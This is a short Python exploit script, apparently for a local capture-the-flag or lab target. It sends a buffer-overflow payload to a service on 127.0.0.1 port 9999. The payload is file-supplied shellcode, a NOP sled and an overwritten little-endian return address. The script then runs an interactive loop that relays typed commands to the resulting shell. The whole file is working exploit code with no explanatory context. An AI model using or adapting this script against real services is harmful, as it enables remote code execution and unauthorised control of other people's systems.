#!/usr/bin/env python3


import socket
import struct
import sys


with open(sys.argv[1], 'rb') as f:
    code = f.read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
s.send(b'........' + code + b'\x90' * (int(sys.argv[2]) - len(code)) + struct.pack('<Q', int(sys.argv[3], 16) + 8) + b'\n')
while True:
    print('> ', end='')
    cmd = input()
    if cmd == '.':
        break
    s.send(cmd.encode() + b'\n')
    print(s.recv(4096).decode('ascii', 'ignore'))
s.close()